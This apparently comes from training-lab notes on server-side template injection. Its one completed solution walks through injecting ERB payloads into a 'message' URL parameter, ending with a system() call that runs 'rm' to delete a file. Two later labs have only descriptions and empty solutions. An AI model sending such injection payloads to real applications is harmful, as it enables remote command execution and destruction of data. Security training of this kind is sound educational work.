# Lab: Basic server-side template injection

**Category:** SSTI

**Difficulty:** Practitioner

**Status:** Solved
 
## Lab Description
This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Solution
Notice that when you try to view more details about the first product, a `GET` request uses the `message` parameter to render `"Unfortunately this product is out of stock"` on the home page. In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page. Use ERB template syntax to create a test payload containing a mathematical operation, for example:
```
<%= 7*7 %>
```
URL-encode this payload and insert it as the value of the `message` parameter in the URL as follows, remembering to replace `LAB-ID` with your own lab ID:
```
https://LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>
```
Load the URL in the browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability. From the Ruby documentation, discover the `system()` method, which can be used to execute arbitrary operating system commands. Construct a payload to delete Carlos's file as follows:
```
<%= system("rm /home/carlos/morale.txt") %>
```
URL-encode your payload and insert it as the value of the `message` parameter, remembering to replace `LAB-ID` with your own lab ID:
```
https://LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

# Lab: Server-side template injection using documentation

**Category:** SSTI

**Difficulty:** Practitioner

**Status:** 
 
## Lab Description
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory. You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`
### Hint: 

## Solution

# Lab: Server-side template injection in an unknown language with a documented exploit

**Category:** SSTI

**Difficulty:** Practitioner

**Status:** 
 
## Lab Description
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Solution
